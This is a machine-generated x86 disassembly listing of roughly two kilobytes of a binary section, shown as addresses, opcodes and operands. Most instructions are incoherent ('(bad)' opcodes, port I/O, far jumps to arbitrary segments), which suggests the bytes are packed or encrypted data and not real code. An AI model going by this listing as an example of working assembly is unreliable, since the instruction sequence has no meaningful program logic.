  420948:	pop    ds
  420949:	inc    edx
  42094a:	stos   BYTE PTR es:[edi],al
  42094b:	rcl    DWORD PTR [ebp+0x457eafb7],0x0
  420952:	inc    eax
  420953:	jmp    0x856d:0x8a626eff
  42095a:	je     0x4209c3
  42095c:	mov    bl,0x4c
  42095e:	mov    esi,ecx
  420960:	xor    al,dl
  420962:	add    al,0xc5
  420964:	fsub   QWORD PTR [ebx-0x4]
  420967:	mov    dl,0x66
  420969:	outs   dx,DWORD PTR ds:[esi]
  42096a:	and    BYTE PTR [esi-0x2b],dl
  42096d:	inc    edi
  42096e:	jmp    0xedfd:0x5f640795
  420975:	clc    
  420976:	dec    eax
  420977:	sahf   
  420978:	fdiv   DWORD PTR [edx-0x31dc45dc]
  42097e:	xchg   esi,eax
  42097f:	or     edi,ebp
  420981:	sub    BYTE PTR [eax+eax*1],al
  420984:	mov    ebp,0xbdd9c182
  420989:	jae    0x420944
  42098b:	icebp  
  42098c:	push   0xba018aa7
  420991:	ja     0x420980
  420993:	out    dx,eax
  420994:	mov    esp,0xe2ac4891
  420999:	loope  0x420954
  42099b:	mov    dh,0x9a
  42099d:	stos   BYTE PTR es:[edi],al
  42099e:	mov    ecx,0xfc03b1b7
  4209a3:	jp     0x420944
  4209a5:	jo     0x4209c6
  4209a7:	jecxz  0x42096b
  4209a9:	adc    al,0xd8
  4209ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ac:	js     0x420973
  4209ae:	pop    es
  4209af:	or     esp,DWORD PTR [esi]
  4209b1:	mov    ds:0xe2ce870e,al
  4209b6:	pop    DWORD PTR [ebp-0x4bc16621]
  4209bc:	shl    eax,cl
  4209be:	into   
  4209bf:	ficom  DWORD PTR [ebx+0x1b]
  4209c2:	(bad)  
  4209c3:	out    0x1,al
  4209c5:	mov    al,0xcc
  4209c7:	xor    ebx,DWORD PTR [ebx-0x17]
  4209ca:	pop    ebx
  4209cb:	ins    DWORD PTR es:[edi],dx
  4209cc:	ds call 0x4e2b:0xc0122976
  4209d4:	mov    ch,0x66
  4209d6:	scas   al,BYTE PTR es:[edi]
  4209d7:	add    ah,BYTE PTR [ecx+ecx*4+0x73bdc0f6]
  4209de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209df:	jp     0x42096e
  4209e1:	mov    ah,0x1
  4209e3:	cmp    ebx,ebp
  4209e5:	call   0xb1fc400c
  4209ea:	fidiv  DWORD PTR [edx-0x18]
  4209ed:	dec    esi
  4209ee:	cmp    al,0x76
  4209f0:	loopne 0x420989
  4209f2:	sbb    al,0xe9
  4209f4:	wrmsr  
  4209f6:	add    al,BYTE PTR [edx+0x57]
  4209f9:	mov    ds:0x1874d35a,al
  4209fe:	mov    eax,0x25d00fc3
  420a03:	imul   edx,DWORD PTR [eax+0xc],0x3b
  420a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a08:	out    dx,al
  420a09:	push   ecx
  420a0a:	inc    esp
  420a0b:	or     DWORD PTR [ebp+0x78559fc2],0xff144ebb
  420a15:	(bad)  
  420a16:	mov    edi,ebp
  420a18:	fstp   TBYTE PTR [bp+si-0x11a4]
  420a1d:	sbb    DWORD PTR [ebp-0x22],ebx
  420a20:	retf   0x6cf
  420a23:	cmp    al,0x25
  420a25:	inc    esi
  420a26:	xchg   esp,eax
  420a27:	mul    BYTE PTR [edi+0x3e2a9d86]
  420a2d:	add    al,0xc9
  420a2f:	or     esi,eax
  420a31:	scas   al,BYTE PTR es:[edi]
  420a32:	push   bp
  420a34:	sbb    eax,0x79240793
  420a39:	scas   eax,DWORD PTR es:[edi]
  420a3a:	hlt    
  420a3b:	fs cld 
  420a3d:	test   BYTE PTR [ebx+0x45],ch
  420a40:	fldenv [eax+0x7c]
  420a43:	xchg   ch,cl
  420a45:	xor    DWORD PTR [edx+edi*1-0x39697e4b],eax
  420a4c:	ja     0x420a4e
  420a4e:	out    0x5b,eax
  420a50:	cmp    al,BYTE PTR [edi]
  420a52:	push   ebp
  420a53:	bound  edx,QWORD PTR [esi]
  420a55:	out    dx,eax
  420a56:	fisub  WORD PTR [eax+0x1fb0665f]
  420a5c:	sbb    eax,0x4c8c7615
  420a61:	lahf   
  420a62:	inc    esp
  420a63:	iret   
  420a64:	sub    al,0x42
  420a66:	mov    eax,ds:0xc6cc54aa
  420a6b:	pop    ebx
  420a6c:	shl    DWORD PTR [ebp+edi*4-0x61],1
  420a70:	xchg   esp,eax
  420a72:	pop    es
  420a73:	adc    BYTE PTR [esp+edi*8],ah
  420a76:	sub    BYTE PTR [edx+0x43905e3c],cl
  420a7c:	and    BYTE PTR [ebp+0x37fdf8ea],dl
  420a82:	adc    esp,DWORD PTR [edx]
  420a84:	fist   DWORD PTR [ebx]
  420a86:	or     eax,0x439f1e02
  420a8b:	xchg   edi,eax
  420a8c:	nop
  420a8d:	rol    ebx,0xe9
  420a90:	repz adc al,0xa9
  420a93:	addr16 or dh,ch
  420a96:	xlat   BYTE PTR ds:[ebx]
  420a97:	push   ss
  420a98:	lea    edx,[edi]
  420a9a:	xchg   esi,eax
  420a9b:	mov    dl,0x60
  420a9d:	shl    BYTE PTR [ecx-0x4c24afa8],1
  420aa3:	sbb    esp,esp
  420aa5:	cld    
  420aa6:	test   BYTE PTR [edx],bh
  420aa8:	pop    es
  420aa9:	dec    ecx
  420aaa:	push   ebx
  420aab:	push   ebx
  420aac:	(bad)  
  420aad:	mov    cl,0x89
  420aaf:	and    DWORD PTR [esi+0x9],edx
  420ab2:	in     al,dx
  420ab3:	fldcw  WORD PTR [ecx-0x7e]
  420ab6:	xchg   DWORD PTR [edi+0x5],esi
  420ab9:	mov    ch,0x74
  420abb:	jb     0x420a7f
  420abd:	jno    0x420a5a
  420abf:	and    eax,0xc8082f45
  420ac4:	sbb    al,0xf9
  420ac6:	test   DWORD PTR [edx+eax*4+0x346e7779],edi
  420acd:	add    eax,0x3dc8abd3
  420ad2:	and    bl,al
  420ad4:	sbb    BYTE PTR [ebp+0x6ed12448],dl
  420ada:	cdq    
  420adb:	push   esi
  420adc:	in     eax,0x8a
  420ade:	inc    edx
  420adf:	push   ds
  420ae0:	in     al,0xa0
  420ae2:	jnp    0x420b46
  420ae4:	pop    es
  420ae5:	cmp    edi,DWORD PTR [ebx+0x14]
  420ae8:	leave  
  420ae9:	dec    eax
  420aea:	fcom   QWORD PTR ds:0x836d359f
  420af0:	sbb    DWORD PTR [edx],ecx
  420af2:	mov    ecx,0x6a880a45
  420af7:	adc    DWORD PTR [esi],esp
  420af9:	inc    eax
  420afa:	aaa    
  420afb:	scas   al,BYTE PTR es:[edi]
  420afc:	cli    
  420afd:	ins    DWORD PTR es:[edi],dx
  420afe:	stc    
  420aff:	je     0x420abe
  420b01:	imul   ecx,DWORD PTR ds:0x13c8babc,0xfffffff5
  420b08:	pop    ss
  420b09:	pushf  
  420b0a:	dec    ebp
  420b0b:	jo     0x420b0e
  420b0d:	out    0x2b,al
  420b0f:	xchg   ebx,eax
  420b10:	push   cs
  420b11:	aas    
  420b12:	cmp    bh,BYTE PTR [esi-0x5a]
  420b15:	mov    ss,ecx
  420b17:	daa    
  420b18:	sbb    DWORD PTR [ecx+eiz*2],ebx
  420b1b:	inc    DWORD PTR [edi]
  420b1d:	sbb    cl,BYTE PTR [ebx]
  420b1f:	sub    bh,BYTE PTR [bp+di]
  420b22:	push   es
  420b23:	sbb    al,0xe8
  420b25:	(bad)  
  420b26:	fadd   QWORD PTR [ebx+0x3d88019e]
  420b2c:	adc    dl,al
  420b2e:	outs   dx,DWORD PTR ds:[esi]
  420b2f:	ins    BYTE PTR es:[edi],dx
  420b30:	xchg   DWORD PTR [edx+ecx*4-0x3e],ebx
  420b34:	or     BYTE PTR [ebx],al
  420b36:	popa   
  420b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b38:	or     BYTE PTR [edx-0x7857a4af],0x5b
  420b3f:	inc    ebx
  420b40:	aaa    
  420b41:	mov    dh,0x17
  420b43:	jmp    DWORD PTR [eax+0x1c54d42]
  420b49:	adc    ebp,DWORD PTR [edx-0x27]
  420b4c:	pop    ds
  420b4d:	mov    bh,0x68
  420b4f:	push   esi
  420b50:	lahf   
  420b51:	mov    dl,0xd7
  420b53:	aad    0xe5
  420b55:	mov    esi,esp
  420b57:	add    eax,0xcb9f8134
  420b5c:	lock imul eax,DWORD PTR [edx+ecx*4-0xa],0x590c0f16
  420b65:	jmp    0x420b3f
  420b67:	retf   
  420b68:	arpl   bp,sp
  420b6a:	mov    WORD PTR [ebx],ss
  420b6c:	popf   
  420b6d:	outs   dx,BYTE PTR ds:[esi]
  420b6e:	sbb    al,0x79
  420b70:	imul   ebx,DWORD PTR [edi+esi*8-0x39324c22],0xa9e421ba
  420b7b:	pop    ecx
  420b7c:	ins    DWORD PTR es:[edi],dx
  420b7d:	enter  0x66ea,0x1f
  420b81:	sbb    BYTE PTR [esi-0x10],dl
  420b84:	add    al,0xc
  420b86:	daa    
  420b87:	add    bh,BYTE PTR [ebp+0x591de2e6]
  420b8d:	push   ss
  420b8e:	mov    dh,0xb4
  420b90:	mov    dl,0x5e
  420b92:	in     eax,0x84
  420b94:	add    al,0xfb
  420b96:	inc    edi
  420b97:	in     al,dx
  420b98:	fdiv   st(6),st
  420b9a:	inc    edx
  420b9b:	and    eax,0xb900c26d
  420ba0:	mov    ch,0x86
  420ba2:	xlat   BYTE PTR ds:[ebx]
  420ba3:	test   al,0x98
  420ba5:	add    DWORD PTR [edi+0x3],eax
  420ba8:	adc    ecx,DWORD PTR [eax+0x6a]
  420bab:	mov    cl,0xac
  420bad:	push   edi
  420bae:	mov    eax,ds:0x2eb70084
  420bb3:	xor    ebx,esp
  420bb5:	popa   
  420bb6:	(bad)  
  420bb8:	mov    es,WORD PTR [edi+edx*4]
  420bbb:	cmp    eax,0x88de1f7e
  420bc0:	push   edi
  420bc1:	inc    ebp
  420bc2:	sub    DWORD PTR ds:0x2863acad,ebp
  420bc8:	ds loop 0x420bb4
  420bcb:	xchg   ecx,eax
  420bcc:	jbe    0x420b88
  420bce:	dec    esp
  420bcf:	fld    DWORD PTR [ebp+0x23]
  420bd2:	inc    eax
  420bd3:	fwait
  420bd4:	sbb    DWORD PTR [eax+eiz*4+0x394a56b2],esp
  420bdb:	pop    ss
  420bdc:	jge    0x420c06
  420bde:	adc    eax,0x7ba6d0fe
  420be3:	sub    BYTE PTR [edx],al
  420be5:	test   DWORD PTR [edx-0x2a0427e0],ebp
  420beb:	sub    BYTE PTR [ecx+0x1bf9e07e],bl
  420bf1:	fld    DWORD PTR [edi+0x44db49e9]
  420bf7:	sub    ebp,DWORD PTR [edi+0x18]
  420bfa:	cdq    
  420bfb:	js     0x420c4c
  420bfd:	push   edx
  420bfe:	lock cmp eax,0xd18e3ee4
  420c04:	push   ecx
  420c05:	lods   al,BYTE PTR ds:[esi]
  420c06:	hlt    
  420c07:	in     al,0x2d
  420c09:	(bad)  
  420c0a:	push   ss
  420c0b:	fild   DWORD PTR [eax]
  420c0d:	cli    
  420c0e:	mov    ?,ebx
  420c10:	mov    esp,0xeff3216b
  420c15:	xchg   edx,eax
  420c16:	(bad)  
  420c17:	sbb    al,0xde
  420c19:	lods   al,BYTE PTR ds:[esi]
  420c1a:	xlat   BYTE PTR ds:[ebx]
  420c1b:	cmp    ecx,DWORD PTR [edx+esi*8]
  420c1e:	js     0x420c35
  420c20:	and    DWORD PTR [esi+0x16a145f6],eax
  420c26:	push   ss
  420c27:	test   eax,0xe35203f
  420c2c:	sub    al,0x70
  420c2e:	mov    edx,0x42a4bfbb
  420c33:	daa    
  420c34:	jbe    0x420bcd
  420c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c37:	or     BYTE PTR [edi+edx*2+0x3d],bl
  420c3b:	fisttp DWORD PTR [edx-0x14e96627]
  420c41:	cmp    eax,0x9e86e799
  420c46:	cmp    BYTE PTR [esi+0x217b7519],0xe7
  420c4d:	ret    0x7f3
  420c50:	neg    BYTE PTR [ecx+edx*4+0x5]
  420c54:	cli    
  420c55:	clc    
  420c56:	clc    
  420c57:	dec    edx
  420c58:	stos   BYTE PTR es:[edi],al
  420c59:	xchg   ecx,eax
  420c5a:	or     ecx,0xd143648c
  420c60:	ror    BYTE PTR [edi],1
  420c62:	xlat   BYTE PTR ds:[ebx]
  420c63:	shl    BYTE PTR [esi-0x68fdcdbb],1
  420c69:	data16 jle 0x420c86
  420c6c:	(bad)  
  420c6d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c6f:	lahf   
  420c70:	(bad)  
  420c71:	mov    ebx,0xf81f2d24
  420c76:	mov    dh,0x7d
  420c78:	sub    eax,0x68fc9622
  420c7d:	push   es
  420c7e:	lods   eax,DWORD PTR ds:[esi]
  420c7f:	dec    edx
  420c80:	lock push ecx
  420c82:	jge    0x420cb7
  420c84:	cdq    
  420c85:	jmp    0x215212bc
  420c8a:	add    bl,cl
  420c8c:	add    DWORD PTR [edi],ebp
  420c8e:	xchg   edi,eax
  420c8f:	mov    dl,0xa0
  420c91:	adc    DWORD PTR [ebp+0x6629de04],edi
  420c97:	and    BYTE PTR [eax+ebp*4+0x1a],0x6d
  420c9c:	movd   DWORD PTR [edi+edi*8],mm2
  420ca0:	out    dx,eax
  420ca1:	(bad)  
  420ca2:	cli    
  420ca3:	aad    0x31
  420ca5:	jb     0x420cf5
  420ca7:	xor    edx,DWORD PTR [eax+0x653f9fcc]
  420cad:	inc    ebp
  420cae:	mov    DWORD PTR [edi],edx
  420cb0:	int    0xf2
  420cb2:	scas   al,BYTE PTR es:[edi]
  420cb3:	push   edx
  420cb4:	mov    BYTE PTR [edx],0xb
  420cb7:	mov    edx,0x2d7dbf55
  420cbc:	mov    edx,0x21562d15
  420cc1:	xchg   DWORD PTR ds:[ebp-0x67],ebp
  420cc5:	mov    ds:0xe8e7bd80,al
  420cca:	add    dh,BYTE PTR [ebp+0x30fe73f1]
  420cd0:	push   ebp
  420cd1:	loope  0x420c84
  420cd3:	sti    
  420cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cd5:	xchg   BYTE PTR [ebx],ah
  420cd7:	into   
  420cd8:	in     al,0x7
  420cda:	pop    ds
  420cdb:	test   al,0x38
  420cdd:	ss aaa 
  420cdf:	jge    0x420d57
  420ce1:	pop    edi
  420ce2:	fsub   st,st(4)
  420ce4:	cwde   
  420ce5:	sub    ch,dl
  420ce7:	mov    es,esi
  420ce9:	ja     0x420c88
  420ceb:	cld    
  420cec:	(bad)
  420cef:	mov    dh,0xbd
  420cf1:	call   0xd10a:0x82fe0f8
  420cf8:	shl    dh,0xb9
  420cfb:	push   0xb911dba0
  420d00:	adc    BYTE PTR ds:0x166b089b,al
  420d06:	push   ebp
  420d07:	mov    esi,0xcbb63624
  420d0c:	repz (bad) 
  420d0e:	adc    esp,eax
  420d10:	mov    cl,0x40
  420d12:	(bad)  
  420d13:	in     al,dx
  420d14:	add    DWORD PTR ds:0xd4f45dc8,ebx
  420d1a:	sti    
  420d1b:	pusha  
  420d1c:	jno    0x420d1f
  420d1e:	cwde   
  420d1f:	xchg   edi,eax
  420d20:	or     al,0xe9
  420d22:	das    
  420d23:	inc    ebp
  420d24:	mov    ch,0x8
  420d26:	sbb    ah,ch
  420d28:	push   ebp
  420d29:	ss aam 0xf1
  420d2c:	scas   al,BYTE PTR es:[edi]
  420d2d:	ins    BYTE PTR es:[edi],dx
  420d2e:	mov    ah,BYTE PTR [ebx+0xc]
  420d31:	adc    eax,0x361268ec
  420d36:	loop   0x420d22
  420d38:	ss (bad) 
  420d3a:	xor    eax,0x1b9a780f
  420d3f:	fisttp QWORD PTR ds:0x5359a81c
  420d45:	stos   WORD PTR es:[edi],ax
  420d47:	shr    DWORD PTR [eax-0x62],cl
  420d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d4b:	push   eax
  420d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d4d:	xor    al,0x7
  420d4f:	or     al,BYTE PTR [edi-0x3dd4d0a9]
  420d55:	and    edx,DWORD PTR [ebp-0x54562de1]
  420d5b:	gs xor al,0x61
  420d5e:	ss adc al,0x33
  420d61:	jno    0x420cf4
  420d63:	mov    ds:0x947554a6,eax
  420d68:	mov    dl,0xda
  420d6a:	das    
  420d6b:	dec    ecx
  420d6c:	mov    esp,0x6748a334
  420d71:	sub    al,0xb0
  420d73:	(bad)  
  420d74:	cld    
  420d75:	xchg   esp,eax
  420d76:	pop    edx
  420d77:	retf   0x9f2b
  420d7a:	nop
  420d7b:	out    dx,eax
  420d7c:	jbe    0x420ddd
  420d7e:	adc    al,0xed
  420d80:	aam    0xe0
  420d82:	dec    esp
  420d83:	push   eax
  420d84:	es add dl,dl
  420d87:	dec    ecx
  420d88:	jl     0x420dcb
  420d8a:	sbb    ebx,edx
  420d8c:	push   0xcf956279
  420d91:	jg     0x420e12
  420d93:	imul   ebx,DWORD PTR [ebx+0x4cabf403],0x9048e999
  420d9d:	jns    0x98e02649
  420da3:	cmp    cl,dh
  420da5:	inc    edx
  420da6:	inc    ebp
  420da7:	inc    ebp
  420da8:	xor    esp,DWORD PTR [ecx+eiz*4+0x2086be4e]
  420daf:	push   cs
  420db0:	sub    DWORD PTR [ebx-0x44],ebx
  420db3:	push   0x71
  420db5:	fnstenv [esi+ecx*1+0x3a]
  420db9:	inc    edi
  420dba:	sti    
  420dbb:	pop    ds
  420dbc:	js     0x420dd0
  420dbe:	fcmovnb st,st(6)
  420dc0:	pop    ds
  420dc1:	ficomp WORD PTR ds:0x74c356fe
  420dc7:	and    BYTE PTR [ebx+0x66],dh
  420dca:	retf   0x8387
  420dcd:	test   eax,0xd28a59
  420dd2:	add    al,0x3a
  420dd4:	bound  ebx,QWORD PTR [edi+0x56]
  420dd7:	(bad)  
  420dd8:	adc    DWORD PTR [ebx+0x26f5662e],esi
  420dde:	jg     0x420dc1
  420de0:	or     ch,BYTE PTR [esi+0x33]
  420de3:	daa    
  420de4:	test   DWORD PTR [eax+esi*4],esi
  420de7:	mov    dl,0x98
  420de9:	(bad)  
  420dea:	fsub   QWORD PTR [ecx-0x5d]
  420ded:	sbb    eax,DWORD PTR [ebx+0x68]
  420df0:	ss sahf 
  420df2:	and    BYTE PTR [ecx+0x7b245749],cl
  420df8:	sbb    DWORD PTR [bx],eax
  420dfb:	rol    BYTE PTR [edx-0x70978f04],cl
  420e01:	imul   ecx,DWORD PTR [edx+0x3cbc576b],0x2b
  420e08:	aad    0x12
  420e0a:	ins    DWORD PTR es:[edi],dx
  420e0b:	xchg   esi,eax
  420e0c:	cmc    
  420e0d:	les    ebp,FWORD PTR [ebx-0x8db3b98]
  420e13:	test   DWORD PTR [ecx],esi
  420e15:	jmp    0x8b7:0xd1fd4264
  420e1c:	mov    al,0xaf
  420e1e:	bnd call 0x815a5d0b
  420e24:	sbb    DWORD PTR [edx+edi*2+0x23],0x2a
  420e29:	xchg   edx,eax
  420e2a:	test   al,cl
  420e2c:	pushf  
  420e2d:	call   0x4028:0xc9435797
  420e34:	dec    eax
  420e35:	push   0x453e8f10
  420e3a:	imul   esi,DWORD PTR [esi+eiz*4-0x457628a9],0x39
  420e42:	mov    DWORD PTR [esi],ebx
  420e44:	pop    ds
  420e45:	adc    esi,0xcfe322b7
  420e4b:	scas   al,BYTE PTR es:[edi]
  420e4c:	sbb    ah,BYTE PTR [ebp-0x75]
  420e4f:	loope  0x420e1b
  420e51:	mov    ?,esp
  420e53:	xor    esi,DWORD PTR [ebp+0x29]
  420e56:	fimul  WORD PTR es:[edx+0x20df169]
  420e5d:	xchg   edi,eax
  420e5e:	mov    esi,0x6288c05
  420e63:	adc    bh,bh
  420e65:	mov    ebp,0x41e15784
  420e6a:	das    
  420e6b:	pop    ss
  420e6c:	dec    eax
  420e6d:	inc    esp
  420e6e:	mov    dh,0x16
  420e70:	pushf  
  420e71:	shl    cl,1
  420e73:	sbb    edx,DWORD PTR [esi-0x38bd54e3]
  420e79:	pop    ebx
  420e7a:	dec    ebp
  420e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e7c:	ins    DWORD PTR es:[edi],dx
  420e7d:	mov    esp,0xcb978263
  420e82:	in     al,dx
  420e83:	jle    0x420e3a
  420e85:	sbb    al,0xa7
  420e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e89:	and    al,0xc1
  420e8b:	je     0x420efa
  420e8d:	mov    esi,0x76df8df
  420e92:	nop
  420e93:	lea    ebx,[ecx+0x6bac6833]
  420e99:	cwde   
  420e9a:	ret    0x5896
  420e9d:	iret   
  420e9e:	shr    BYTE PTR [ebp-0x1e94b45d],0xa4
  420ea5:	pop    ss
  420ea6:	ds jmp 0xf9156b0d
  420eac:	cmp    BYTE PTR ds:0x44ee3bc,0xab
  420eb3:	mov    ?,ecx
  420eb5:	sub    BYTE PTR [esp+edi*8+0x4ec1438d],ah
  420ebc:	cmp    cl,cl
	...
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     dl,BYTE PTR [ebx-0x43a0085e]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	jl     0x420ee6
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	mov    bl,0x4c
  420ee4:	push   ss
  420ee5:	mov    ecx,0xb5dbfc17
  420eea:	inc    edi
  420eeb:	jp     0x420f16
  420eed:	rcr    bh,0xe0
  420ef0:	enter  0x1e53,0x2
  420ef4:	adc    al,0xfc
  420ef6:	ds test cl,bh
  420ef9:	jbe    0x420f5a
  420efb:	jns    0x420f16
  420efd:	jns    0x420ef0
  420eff:	popa   
  420f00:	pop    esi
  420f01:	repnz arpl ax,sp
  420f04:	jno    0x420f3f
  420f06:	int    0x5c
  420f08:	fsub   QWORD PTR [eax]
  420f0a:	(bad)  
  420f0b:	sub    BYTE PTR ds:0x5a3ceb3,ch
  420f11:	imul   edi,DWORD PTR [ebx-0x49],0x6420c3fb
  420f18:	std    
  420f19:	(bad)  
  420f1a:	loopne 0x420f29
  420f1c:	xchg   esp,eax
  420f1d:	rcr    BYTE PTR [edi+edi*8],cl
  420f20:	fstp   DWORD PTR [eax+0x3f9c7b1b]
  420f26:	adc    eax,0xb89bc17b
  420f2b:	cmc    
  420f2c:	xor    BYTE PTR [edi-0x6941759a],ch
  420f32:	sbb    eax,0x7afa341e
  420f37:	pop    ds
  420f38:	mov    ebx,DWORD PTR [edx+eiz*8]
  420f3b:	and    DWORD PTR [eax],eax
  420f3d:	add    eax,0xe390e7c1
  420f42:	pop    ebx
  420f43:	mov    esp,0x55272779
  420f48:	js     0x420f6b
  420f4a:	(bad)  
  420f4c:	cmp    al,0x24
  420f4e:	cs icebp 
  420f50:	sub    dh,BYTE PTR [ebp-0x723bfdc9]
  420f56:	jne    0x420f51
  420f58:	jne    0x420f75
  420f5a:	pop    ebx
  420f5b:	jg     0x420f77
  420f5d:	retf   
  420f5e:	aaa    
  420f5f:	pop    es
  420f60:	xchg   edx,esp
  420f62:	aas    
  420f63:	xchg   ecx,eax
  420f64:	fcmovnbe st,st(2)
  420f66:	rcl    BYTE PTR [ebp+0x9d34408],0x50
  420f6d:	icebp  
  420f6e:	xor    eax,0x1d3ac5a5
  420f73:	push   esi
  420f74:	mov    ds:0x97dcaad2,al
  420f79:	dec    esi
  420f7a:	arpl   WORD PTR [eax-0x76],di
  420f7d:	(bad)  
  420f7e:	nop
  420f7f:	les    ebx,FWORD PTR [ebx]
  420f81:	call   0x47cd:0x43f5f954
  420f88:	pop    ds
  420f89:	pop    eax
  420f8a:	xchg   ebp,eax
  420f8b:	lods   eax,DWORD PTR ds:[esi]
  420f8c:	cmc    
  420f8d:	sti    
  420f8e:	pushf  
  420f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f90:	mov    eax,ds:0xe279a0f6
  420f95:	xchg   edx,eax
  420f96:	mov    eax,ds:0xc8a9449d
  420f9b:	push   eax
  420f9c:	adc    esi,DWORD PTR ds:0x91f3bcc9
  420fa2:	jecxz  0x420fe0
  420fa4:	std    
  420fa5:	mov    esp,DWORD PTR [edi+0x7404651b]
  420fab:	js     0x420f60
  420fad:	mov    gs,WORD PTR [esp+ecx*2+0x66]
  420fb1:	repz or BYTE PTR [ebx+edx*4],bh
  420fb5:	loopne 0x421020
  420fb7:	adc    al,BYTE PTR [ecx+0x57b3e1d6]
  420fbd:	cmp    eax,0x7c0c29d7
  420fc2:	push   esi
  420fc3:	cmp    cl,BYTE PTR [esi-0x1f]
  420fc6:	pop    ebx
  420fc7:	call   0xa4e2:0x32b800ea
  420fce:	ins    DWORD PTR es:[edi],dx
  420fcf:	sub    al,0xa6
  420fd1:	adc    al,0x10
  420fd3:	mov    al,0x34
  420fd5:	imul   eax,DWORD PTR [ebx+0x71],0x12038616
  420fdc:	aam    0xb7
  420fde:	rcr    DWORD PTR [eax],0x5f
  420fe1:	loopne 0x421009
  420fe3:	(bad)  
  420fe4:	loopne 0x420f8c
  420fe6:	gs pusha 
  420fe8:	les    esp,FWORD PTR [esi]
  420fea:	jno    0x42100c
  420fec:	cmp    dl,BYTE PTR [eax-0x5b]
  420fef:	xchg   edx,eax
  420ff0:	push   ss
  420ff1:	mov    esi,0xbeab1653
  420ff6:	je     0x420fe4
  420ff8:	mov    dl,0xbe
  420ffa:	cs inc eax
  420ffc:	adc    ebp,ebx
  420ffe:	int    0xd9
  421000:	xor    DWORD PTR [eax],ecx
  421002:	pop    es
  421003:	dec    eax
  421004:	rcl    BYTE PTR [esi],cl
  421006:	in     eax,dx
  421007:	dec    ebx
  421008:	or     eax,0xe391d16d
  42100d:	sub    BYTE PTR [esi-0x558d6a78],ah
  421013:	fldlg2 
  421015:	je     0x421065
  421017:	or     eax,0xd49d16
  42101c:	shr    edx,1
  42101e:	mov    ch,BYTE PTR [esi+0x1b]
  421021:	adc    bh,BYTE PTR [ecx-0x45]
  421024:	adc    BYTE PTR [edi-0x16],bh
  421027:	scas   al,BYTE PTR es:[edi]
  421028:	(bad)  
  421029:	scas   eax,DWORD PTR es:[edi]
  42102a:	arpl   sp,dx
  42102c:	jecxz  0x421091
  42102e:	test   BYTE PTR [eax+0x7c],bl
  421031:	fild   WORD PTR [edi+0x2668a0f5]
  421037:	out    0xca,al
  421039:	(bad)  [ebx-0x438d309d]
  42103f:	mov    eax,0xd0deccbb
  421044:	ror    BYTE PTR [ecx-0x7e],1
  421047:	ins    BYTE PTR es:[edi],dx
  421048:	std    
  421049:	pop    es
  42104a:	and    DWORD PTR [esi],edx
  42104c:	mov    dh,0x30
  42104e:	push   ds
  42104f:	test   DWORD PTR [ecx],eax
  421051:	scas   eax,DWORD PTR es:[edi]
  421052:	(bad)  
  421053:	sbb    ebx,ecx
  421055:	ds inc esi
  421057:	inc    ecx
  421058:	into   
  421059:	and    BYTE PTR [edx+0x466bc7ee],bl
  42105f:	pminsw mm0,mm3
  421062:	push   eax
  421063:	add    DWORD PTR [eax-0x1c1fa54f],ebx
  421069:	pop    ebx
  42106a:	pop    ebp
  42106b:	inc    esi
  42106c:	mov    cl,0x8e
  42106e:	or     ecx,edi
  421070:	in     al,dx
  421071:	sub    eax,0x2dc8fa6f
  421076:	js     0x421065
  421078:	sub    BYTE PTR [ebx],0x65
  42107b:	sbb    dl,ah
  42107d:	int    0x96
  42107f:	imul   esp,DWORD PTR [edx+0x524deed2],0x31
  421086:	jnp    0x421027
  421088:	in     al,0xca
  42108a:	sbb    al,0x19
  42108c:	add    BYTE PTR [edx],al
  42108e:	push   ebx
  42108f:	cmp    ecx,esp
  421091:	adc    al,0xa
  421093:	std    
  421094:	enter  0x8322,0xe8
  421098:	jl     0x4210b4
  42109a:	icebp  
  42109b:	loopne 0x421048
  42109d:	rcl    BYTE PTR [ebx-0x58],1
  4210a0:	xlat   BYTE PTR ds:[ebx]
  4210a1:	(bad)  
  4210a2:	jmp    0x8bb1:0xe0e91237
  4210a9:	or     eax,0x7dbca634
  4210ae:	jp     0x42109d
  4210b0:	test   eax,0x7cb28309
  4210b5:	and    DWORD PTR [ecx-0x2b],ebx
  4210b8:	pop    edi
  4210b9:	inc    eax
  4210ba:	pop    ecx
  4210bb:	repz push edx
  4210bd:	and    DWORD PTR [eax-0x4db2e9ca],eax
  4210c3:	in     al,0xe1
  4210c5:	call   0x80ea:0x364a80fb
  4210cc:	mov    dl,0x11
  4210ce:	fmul   QWORD PTR [ebx+0x573c34ea]
  4210d4:	mov    WORD PTR ds:0x122eedb5,ds
  4210da:	mov    ds:0xd6a186b6,al
  4210df:	inc    edx
  4210e0:	pusha  
  4210e1:	push   ss
  4210e2:	xchg   DWORD PTR [edx+0x4a],eax
  4210e5:	nop
  4210e6:	imul   esi,DWORD PTR [eax-0x52],0x477ec02d
  4210ed:	xchg   edi,eax
  4210ee:	push   edi
  4210ef:	ins    BYTE PTR es:[edi],dx
  4210f0:	mov    eax,0x9cd6611
  4210f5:	stc    
  4210f6:	inc    esp
  4210f7:	inc    esi
  4210f8:	cmc    
  4210f9:	xchg   ebx,eax
  4210fa:	xor    eax,0x3eb6179d
  4210ff:	jns    0x5ebf6d89
  421105:	adc    bl,BYTE PTR [eax-0x2c]
  421108:	sub    al,0x4f
  42110a:	push   ss
  42110b:	pop    ebx
  42110c:	xchg   edx,eax
  42110d:	xor    DWORD PTR ss:[ebp-0x330ab9c9],esi
